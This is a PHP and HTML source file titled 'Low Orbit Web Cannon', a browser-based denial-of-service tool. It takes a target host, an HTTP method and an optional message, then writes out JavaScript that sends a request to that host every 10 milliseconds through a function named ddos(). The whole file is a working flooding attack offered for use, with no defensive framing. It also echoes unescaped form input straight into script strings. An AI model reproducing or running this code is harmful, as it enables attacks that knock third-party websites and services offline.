<!DOCTYPE html>

  <html>

    <head>

      <title>Low Orbit Web Cannon</title>

      <style>

        input[type=submit] {

          top: -9999px;

          left: -9999px;

          position: absolute

        }

      </style>

    </head>

    <body>

    <form name="form" id="form" action="" method="POST">

      <label>Host: <input type="text" name="host" id="host" /></label><Br>

      <label>Method(GET/POST)P.S: Select POST to append message: <input type="text" name="method" id="method" /></label><Br>

      <label>Append message: <input type="text" name="message" id="message" /></label><Br>

      <input type="submit" name="submit" id="submit" value="submit" />

      <label for="submit">FIRE TEH LAZERZ!</label>

    </form>

<?php

  if(isset($_POST["submit"])) {

    $host = $_POST["host"];

    $method = $_POST["method"];

    $message = $_POST["message"];

    if(!(isset($host) and isset($method))) {

      die("Host and Method fields are required. Please reload the page and enter valid information.");

    } else {

      $c = array("POST", "GET");

      if(!(in_array($method, $c))) {

        die("Error: invalid data: " . $method . " in the Method field. Only POST and GET are valid. Please reload the page and enter valid information.");

      } else {

        if($method === "GET") {

?>

      <script>

        function ddos() {

          var HOST = "<?php echo $host; ?>";

          var METHOD = "<?php echo $method; ?>";

          http = new XMLHttpRequest();

          http.open(METHOD, HOST, true);

          http.send();

        }

        setInterval(ddos, 10);

      </script>

<?php

        } else if($method === "POST") {

?>

      <script>

        function ddos() {

          var HOST = "<?php echo $host; ?>";

          var METHOD = "<?php echo $method; ?>";

          var MESSAGE = "<?php echo $message; ?>";

          http = new XMLHttpRequest();

          http.open(METHOD, HOST, true);

          http.send(MESSAGE);

        }

        setInterval(ddos, 10);

      </script>

<?php

        }

      }

    }

  }

?>
